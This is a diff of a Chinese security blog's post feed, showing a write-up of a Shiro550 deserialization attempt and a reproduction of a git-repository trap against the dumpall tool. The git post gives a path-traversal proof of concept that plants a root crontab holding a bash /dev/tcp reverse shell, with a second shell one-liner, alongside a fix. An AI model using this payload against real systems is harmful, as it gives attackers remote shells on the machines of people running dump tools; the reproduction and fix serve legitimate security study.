@@ -659,6 +659,48 @@
       </tags>
   </entry>
   <entry>
+    <title>Java反序列化漏洞分析(二)-Shiro550</title>
+    <url>/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/</url>
+    <content><![CDATA[<blockquote>
+<p>  这是一篇失败的文章，要学的东西太多了，高看我自己了。终究是纸上得来终觉浅，绝知此事要躬行</p>
+</blockquote>
+<h2 id="0x00-纠错"><a href="#0x00-纠错" class="headerlink" title="0x00 纠错"></a>0x00 纠错</h2><p>首先纠正一下上篇文章<a href="">Java反序列化漏洞分析(一)-Shiro550</a>的错误错误，上篇提到dnslog使用原生环境搭建没有打成功，这是<strong>错的</strong>、<strong>错的</strong>、<strong>错的</strong>，其实是可以打的。我给搞错了，<strong>URLDNS</strong> 这个利用链本身不依赖于任何第三方库，同时不限制jdk的版本，所以通常是用来检测反序列化的点（目标出网），我当时没打成功，是因为我做实验时，用了<strong>同一条</strong>dnslog的url打过一遍，第二遍死活不出结果，写这篇文章时又测了几次，发现是url的锅，要不停的变换才会一直出结果<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210524215703.png" alt="原生的shiro550可以使用dnslog探测"></p>
+<blockquote>
+<p>  Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。</p>
+</blockquote>
+<h2 id="0x01-原生Shiro550执行命令"><a href="#0x01-原生Shiro550执行命令" class="headerlink" title="0x01 原生Shiro550执行命令"></a>0x01 原生Shiro550执行命令</h2><p>当使用<strong>URLDNS链</strong>打过去，在DNSLOG平台有回显的时候，就说明这个地方存在反序列化漏洞。</p>
+<p>但是要利用的话还得是使用CC链等利用链去进行命令的执行（shiro550中自带的是cc3.2.1版本的组件）。</p>
+<p>经过测试<strong>ysoserial</strong>拥有的CommonsCollections利用链从1-7都无法成功执行命令, 都是报错<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211912.png" alt="image-20210528211554019"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211926.png" alt="image-20210525211529910"></p>
+<p>无法反序列化一个数组，经常敲代码，修bug的都知道，报错的位置一般都在最下边的，去看看</p>
+<p><code>at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77)</code> 直接点过去看看<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211917.png" alt="image-20210526220345069"></p>
+<p>可以看到在<a href="">初探Java反序列化漏洞(一)</a>中提到的重点函数<strong>readObject()<strong>函数，但是又有一点点不一样，它这里是</strong>new</strong>了一个<strong>ClassResolvingObjectInputStream</strong>,而非传统的<strong>ObjectInputStream</strong> 问题就可能出现在这里，全局搜索看下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211939.png" alt="image-20210526220837880"></p>
+<p>这里是通过 <strong>ClassUtils.forName(osc.getName());<strong>来反射调用的，而前面都是通过</strong>Class.forName(“java.lang.Runtime”);</strong> 来进行反射执行命令的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211949.png" alt="image-20210526221020003"></p>
+<p>直接在这里下断点，然后使用CC2链打一下，调试半天也没看懂，太菜了，先记下 参考文章中说的是</p>
+<blockquote>
+<p>  Shiro resovleClass 使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
+</blockquote>
+<p>别人在环境中引入了<code>commons-collections4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。（后续学习这条链）</p>
+<h2 id="0x01-构造新的利用链"><a href="#0x01-构造新的利用链" class="headerlink" title="0x01 构造新的利用链"></a>0x01 构造新的利用链</h2><p>我不会。。。 看半天还是没看懂，前置知识缺的有点多，直接放链接吧</p>
+<p><a href="https://www.anquanke.com/post/id/192619#h2-3">https://www.anquanke.com/post/id/192619#h2-3</a> </p>
+<p>总结就是利用链中的<code>ChainedTransformer</code>这个类的利用是无法成功的，因为它的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，最终通过使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes</p>
+<p>通过大佬改造的<a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a> CommonsCollections10 利用链打一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210529212125.png" alt="image-20210527084745187"></p>
+<p>这个图<strong>又是假</strong>的，淦，用大佬的CC10链打了之后，突然怀疑之前的命令搞错了，我之前是用<code>whoami</code>测试的，我想起了mac命令执行不太一样，重新用<code>open -a Calculator</code>试了一遍，发现CC2链又可以成功了，瞬间凌乱（已经把添加的commons-collections4.0版本给注释了），这两天一直在重新测试找原因，通过重新下载shiro，切换版本重新来一遍，CC2并不可以打原生的shiro550，用大佬的CC10也打不出来，原因也找不到，前置知识缺的太多了，再搞下去也是浪费时间。</p>
+<p>最终找到我为啥可以打成功，因为我在<code>shiro/samples/web</code>目录下生成过war包，当时是在测试4.0版本RCE，生成的target目录没有删除，之后启动的时候应该都是使用target目录下的东西，即使去除4.0版本依旧没用，生成的war包并没有改变还是可以RCE的4.0版本，搞得我怀疑人生。还有说<strong>JRMP</strong> 这个<strong>Gadget</strong>可以打，也是废了，没成功。</p>
+<p>不搞了，心累，等补充完知识，再重新来吧</p>
+<p>接下来通过<a href="https://github.com/frohoff/ysoserial%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%A7%EF%BC%8C%E6%85%A2%E6%85%A2%E6%9D%A5%E5%90%A7%E3%80%82">https://github.com/frohoff/ysoserial这个项目来学习java反序列化的利用链吧，慢慢来吧。</a></p>
+<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>推荐一个Chrome插件—<strong>Toby for Chrome</strong>，适合舍不得关标签页，留待后续研究的。</p>
+<p>中途参考的文章太多了，就用这个插件生成的分享链接吧</p>
+<p><a href="https://www.gettoby.com/p/m9955hzbsf6s">https://www.gettoby.com/p/m9955hzbsf6s</a></p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java反序列化漏洞分析(一)-Shiro550</title>
     <url>/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</url>
     <content><![CDATA[<blockquote>
@@ -757,48 +799,6 @@
 <h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Apache Shiro Java 反序列化漏洞分析 <a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a> </p>
 <p>Java安全之Shiro 550反序列化漏洞分析 <a href="https://www.anquanke.com/post/id/225442#h3-8">https://www.anquanke.com/post/id/225442#h3-8</a> </p>
 <p>ysoserial <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
-]]></content>
-      <categories>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>漏洞原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java反序列化漏洞分析(二)-Shiro550</title>
-    <url>/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/</url>
-    <content><![CDATA[<blockquote>
-<p>  这是一篇失败的文章，要学的东西太多了，高看我自己了。终究是纸上得来终觉浅，绝知此事要躬行</p>
-</blockquote>
-<h2 id="0x00-纠错"><a href="#0x00-纠错" class="headerlink" title="0x00 纠错"></a>0x00 纠错</h2><p>首先纠正一下上篇文章<a href="">Java反序列化漏洞分析(一)-Shiro550</a>的错误错误，上篇提到dnslog使用原生环境搭建没有打成功，这是<strong>错的</strong>、<strong>错的</strong>、<strong>错的</strong>，其实是可以打的。我给搞错了，<strong>URLDNS</strong> 这个利用链本身不依赖于任何第三方库，同时不限制jdk的版本，所以通常是用来检测反序列化的点（目标出网），我当时没打成功，是因为我做实验时，用了<strong>同一条</strong>dnslog的url打过一遍，第二遍死活不出结果，写这篇文章时又测了几次，发现是url的锅，要不停的变换才会一直出结果<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210524215703.png" alt="原生的shiro550可以使用dnslog探测"></p>
-<blockquote>
-<p>  Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。</p>
-</blockquote>
-<h2 id="0x01-原生Shiro550执行命令"><a href="#0x01-原生Shiro550执行命令" class="headerlink" title="0x01 原生Shiro550执行命令"></a>0x01 原生Shiro550执行命令</h2><p>当使用<strong>URLDNS链</strong>打过去，在DNSLOG平台有回显的时候，就说明这个地方存在反序列化漏洞。</p>
-<p>但是要利用的话还得是使用CC链等利用链去进行命令的执行（shiro550中自带的是cc3.2.1版本的组件）。</p>
-<p>经过测试<strong>ysoserial</strong>拥有的CommonsCollections利用链从1-7都无法成功执行命令, 都是报错<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211912.png" alt="image-20210528211554019"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211926.png" alt="image-20210525211529910"></p>
-<p>无法反序列化一个数组，经常敲代码，修bug的都知道，报错的位置一般都在最下边的，去看看</p>
-<p><code>at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77)</code> 直接点过去看看<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211917.png" alt="image-20210526220345069"></p>
-<p>可以看到在<a href="">初探Java反序列化漏洞(一)</a>中提到的重点函数<strong>readObject()<strong>函数，但是又有一点点不一样，它这里是</strong>new</strong>了一个<strong>ClassResolvingObjectInputStream</strong>,而非传统的<strong>ObjectInputStream</strong> 问题就可能出现在这里，全局搜索看下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211939.png" alt="image-20210526220837880"></p>
-<p>这里是通过 <strong>ClassUtils.forName(osc.getName());<strong>来反射调用的，而前面都是通过</strong>Class.forName(“java.lang.Runtime”);</strong> 来进行反射执行命令的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211949.png" alt="image-20210526221020003"></p>
-<p>直接在这里下断点，然后使用CC2链打一下，调试半天也没看懂，太菜了，先记下 参考文章中说的是</p>
-<blockquote>
-<p>  Shiro resovleClass 使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
-</blockquote>
-<p>别人在环境中引入了<code>commons-collections4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。（后续学习这条链）</p>
-<h2 id="0x01-构造新的利用链"><a href="#0x01-构造新的利用链" class="headerlink" title="0x01 构造新的利用链"></a>0x01 构造新的利用链</h2><p>我不会。。。 看半天还是没看懂，前置知识缺的有点多，直接放链接吧</p>
-<p><a href="https://www.anquanke.com/post/id/192619#h2-3">https://www.anquanke.com/post/id/192619#h2-3</a> </p>
-<p>总结就是利用链中的<code>ChainedTransformer</code>这个类的利用是无法成功的，因为它的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，最终通过使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes</p>
-<p>通过大佬改造的<a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a> CommonsCollections10 利用链打一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210529212125.png" alt="image-20210527084745187"></p>
-<p>这个图<strong>又是假</strong>的，淦，用大佬的CC10链打了之后，突然怀疑之前的命令搞错了，我之前是用<code>whoami</code>测试的，我想起了mac命令执行不太一样，重新用<code>open -a Calculator</code>试了一遍，发现CC2链又可以成功了，瞬间凌乱（已经把添加的commons-collections4.0版本给注释了），这两天一直在重新测试找原因，通过重新下载shiro，切换版本重新来一遍，CC2并不可以打原生的shiro550，用大佬的CC10也打不出来，原因也找不到，前置知识缺的太多了，再搞下去也是浪费时间。</p>
-<p>最终找到我为啥可以打成功，因为我在<code>shiro/samples/web</code>目录下生成过war包，当时是在测试4.0版本RCE，生成的target目录没有删除，之后启动的时候应该都是使用target目录下的东西，即使去除4.0版本依旧没用，生成的war包并没有改变还是可以RCE的4.0版本，搞得我怀疑人生。还有说<strong>JRMP</strong> 这个<strong>Gadget</strong>可以打，也是废了，没成功。</p>
-<p>不搞了，心累，等补充完知识，再重新来吧</p>
-<p>接下来通过<a href="https://github.com/frohoff/ysoserial%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%A7%EF%BC%8C%E6%85%A2%E6%85%A2%E6%9D%A5%E5%90%A7%E3%80%82">https://github.com/frohoff/ysoserial这个项目来学习java反序列化的利用链吧，慢慢来吧。</a></p>
-<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>推荐一个Chrome插件—<strong>Toby for Chrome</strong>，适合舍不得关标签页，留待后续研究的。</p>
-<p>中途参考的文章太多了，就用这个插件生成的分享链接吧</p>
-<p><a href="https://www.gettoby.com/p/m9955hzbsf6s">https://www.gettoby.com/p/m9955hzbsf6s</a></p>
 ]]></content>
       <categories>
         <category>漏洞原理</category>
@@ -1004,6 +1004,60 @@
       </tags>
   </entry>
   <entry>
+    <title>git 蜜罐复现</title>
+    <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<blockquote>
+<p>  好久不见</p>
+</blockquote>
+<h2 id="0x01-git-蜜罐复现"><a href="#0x01-git-蜜罐复现" class="headerlink" title="0x01 git 蜜罐复现"></a>0x01 git 蜜罐复现</h2><p>具体原理请看 <a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> git</span><br><span class="line"></span><br><span class="line">repo = git.Repo.init(path=<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">repo.index.add(items=[<span class="string">&#x27;../../git_poc.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">repo.index.commit(<span class="string">&#x27;commit&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>python3 -m pip install GitPython</code></p>
+<p>python3 运行, 生成Poc </p>
+<blockquote>
+<p>  在当前目录的..&#x2F;..&#x2F;的目录下必须有git_poc.txt</p>
+</blockquote>
+<p>比如当前脚本目录为 <code>/Users/yhy/Desktop/gitpoc</code>,那么在<code>/Users/yhy</code>要存在<code>git_poc.txt</code></p>
+<p>然后将 <strong>.git</strong> 文件夹整体拖入网站根目录下</p>
+<p>效果：防止干扰我直接在虚拟机中运行 <a href="https://github.com/0xHJK/dumpall.git">dumpall</a> 工具</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174743.png" alt="image-20210809154939407"></p>
+<p>没有在 <strong>dumpall&#x2F;192.168.100.250_8080</strong> 目录下生成文件，而是进行了<strong>目录穿越</strong>,在原计划（dumpall&#x2F;192.168.100.250_8080）两层外的目录下生成了git_poc</p>
+<h3 id="1-1-计划任务反弹shell"><a href="#1-1-计划任务反弹shell" class="headerlink" title="1.1 计划任务反弹shell"></a>1.1 计划任务反弹shell</h3><p>先在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 下新建名为 root 的反弹shell代码文件。</p>
+<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
+<p>然后将<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> 中的<code>../../git_poc.txt</code> 替换, 使用多个**..&#x2F;**,确保返回到根目录 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">repo.index.add(items=[<span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root (centos系列主机)</p>
+<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (debian系列主机)</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174751.png" alt="image-20210809173416573"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174728.png" alt="image-20210809173349713"></p>
+<h2 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h2><p>这就是个目录穿越漏洞，这里简单粗暴的将 <strong>..&#x2F;</strong> 全部删除，以dumpall为例 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumpall/dumper.py</span></span><br><span class="line">filename = <span class="built_in">str</span>(filename).replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;/&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174721.png" alt="image-20210809174123558"></p>
+<h2 id="0x03在ubuntu中反弹shell问题"><a href="#0x03在ubuntu中反弹shell问题" class="headerlink" title="0x03在ubuntu中反弹shell问题"></a>0x03在ubuntu中反弹shell问题</h2><p>有师傅反应说上一篇<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484658&idx=1&sn=84f39840f9a8104edc4fde4c7962fed6&chksm=c2829debf5f514fd40c1abbe73beabe02b2cbe1e190504bb5e060ab445d1cab086c247674fa4&scene=21#wechat_redirect">git 蜜罐复现</a>文章中在ubuntu和kali写入了计划任务，还是不能反弹shell。</p>
+<p>关于这一点我在做实验时，一开始也是没有反弹shell，我手动编辑了几遍root文件，具体弹shell的代码并没有改变，然后就莫名其妙的弹回来了，忙着发文，也就没有再次实验，我的错。</p>
+<p>今天又试了好多次，还是弹不回来，终于找到了原因，这东西就是<strong>ubuntu系统的原因，root文件的权限必须为600</strong>，还有就是弹的代码也有点问题，这是原文链接：</p>
+<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+<p>shell不能反弹，可以写ssh公钥等，最后他给的弹shell代码<strong>好像</strong>还有点问题，在代码前后空一格，写入换行符</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*/1 * * * * bash -c <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
+<p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
+<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>蜜罐</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>蜜罐</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows系统散列值获取</title>
     <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
     <content><![CDATA[<blockquote>
@@ -1085,60 +1139,6 @@
       <tags>
         <tag>Windows提权</tag>
         <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git 蜜罐复现</title>
-    <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<blockquote>
-<p>  好久不见</p>
-</blockquote>
-<h2 id="0x01-git-蜜罐复现"><a href="#0x01-git-蜜罐复现" class="headerlink" title="0x01 git 蜜罐复现"></a>0x01 git 蜜罐复现</h2><p>具体原理请看 <a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> git</span><br><span class="line"></span><br><span class="line">repo = git.Repo.init(path=<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">repo.index.add(items=[<span class="string">&#x27;../../git_poc.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">repo.index.commit(<span class="string">&#x27;commit&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><code>python3 -m pip install GitPython</code></p>
-<p>python3 运行, 生成Poc </p>
-<blockquote>
-<p>  在当前目录的..&#x2F;..&#x2F;的目录下必须有git_poc.txt</p>
-</blockquote>
-<p>比如当前脚本目录为 <code>/Users/yhy/Desktop/gitpoc</code>,那么在<code>/Users/yhy</code>要存在<code>git_poc.txt</code></p>
-<p>然后将 <strong>.git</strong> 文件夹整体拖入网站根目录下</p>
-<p>效果：防止干扰我直接在虚拟机中运行 <a href="https://github.com/0xHJK/dumpall.git">dumpall</a> 工具</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174743.png" alt="image-20210809154939407"></p>
-<p>没有在 <strong>dumpall&#x2F;192.168.100.250_8080</strong> 目录下生成文件，而是进行了<strong>目录穿越</strong>,在原计划（dumpall&#x2F;192.168.100.250_8080）两层外的目录下生成了git_poc</p>
-<h3 id="1-1-计划任务反弹shell"><a href="#1-1-计划任务反弹shell" class="headerlink" title="1.1 计划任务反弹shell"></a>1.1 计划任务反弹shell</h3><p>先在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 下新建名为 root 的反弹shell代码文件。</p>
-<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
-<p>然后将<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> 中的<code>../../git_poc.txt</code> 替换, 使用多个**..&#x2F;**,确保返回到根目录 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">repo.index.add(items=[<span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root (centos系列主机)</p>
-<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (debian系列主机)</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174751.png" alt="image-20210809173416573"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174728.png" alt="image-20210809173349713"></p>
-<h2 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h2><p>这就是个目录穿越漏洞，这里简单粗暴的将 <strong>..&#x2F;</strong> 全部删除，以dumpall为例 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumpall/dumper.py</span></span><br><span class="line">filename = <span class="built_in">str</span>(filename).replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;/&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174721.png" alt="image-20210809174123558"></p>
-<h2 id="0x03在ubuntu中反弹shell问题"><a href="#0x03在ubuntu中反弹shell问题" class="headerlink" title="0x03在ubuntu中反弹shell问题"></a>0x03在ubuntu中反弹shell问题</h2><p>有师傅反应说上一篇<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484658&idx=1&sn=84f39840f9a8104edc4fde4c7962fed6&chksm=c2829debf5f514fd40c1abbe73beabe02b2cbe1e190504bb5e060ab445d1cab086c247674fa4&scene=21#wechat_redirect">git 蜜罐复现</a>文章中在ubuntu和kali写入了计划任务，还是不能反弹shell。</p>
-<p>关于这一点我在做实验时，一开始也是没有反弹shell，我手动编辑了几遍root文件，具体弹shell的代码并没有改变，然后就莫名其妙的弹回来了，忙着发文，也就没有再次实验，我的错。</p>
-<p>今天又试了好多次，还是弹不回来，终于找到了原因，这东西就是<strong>ubuntu系统的原因，root文件的权限必须为600</strong>，还有就是弹的代码也有点问题，这是原文链接：</p>
-<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
-<p>shell不能反弹，可以写ssh公钥等，最后他给的弹shell代码<strong>好像</strong>还有点问题，在代码前后空一格，写入换行符</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*/1 * * * * bash -c <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
-<p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
-<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-        <category>蜜罐</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>蜜罐</tag>
       </tags>
   </entry>
   <entry>
@@ -1281,6 +1281,86 @@
       </tags>
   </entry>
   <entry>
+    <title>令牌窃取分析及防范</title>
+    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
+    <content><![CDATA[<blockquote>
+<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
+</blockquote>
+<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
